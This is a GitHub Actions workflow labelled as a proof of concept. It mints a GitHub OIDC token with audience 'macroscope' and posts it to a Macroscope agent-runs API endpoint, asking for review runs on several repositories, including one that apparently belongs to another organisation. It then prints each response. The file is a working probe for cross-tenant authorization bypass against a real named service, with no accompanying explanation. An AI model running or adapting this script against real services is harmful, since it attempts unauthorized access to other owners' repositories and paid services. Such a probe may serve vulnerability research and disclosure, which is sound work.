name: MS OIDC PoC
on: push
permissions:
  id-token: write
  contents: read
jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: mint-and-probe
        env:
          ARU: ${{ ACTIONS_ID_TOKEN_REQUEST_URL }}
          ART: ${{ ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
        run: |
          SEP='&'
          case "$ARU" in *\?*) ;; *) SEP='?' ;; esac
          OIDC=$(curl -s -H "Authorization: Bearer $ART" "${ARU}${SEP}audience=macroscope" | jq -r .value)
          echo "oidc-len: ${#OIDC}"
          for REPO in "gyoomei/rialo-rush" "prassoai/macroscope-actions" "gyoomei/nope-nonexistent"; do
            echo "=== repo: $REPO"
            curl -s -o /tmp/out.json -w "HTTP %{http_code}\n" -X POST \
              -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" \
              -d "{\"repository\":\"$REPO\",\"review\":{\"kind\":\"cra\"},\"commit\":\"0123456789abcdef0123456789abcdef01234567\"}" \
              https://actions.macroscope.com/api/v1/github-actions/agent-runs
            head -c 500 /tmp/out.json; echo
          done
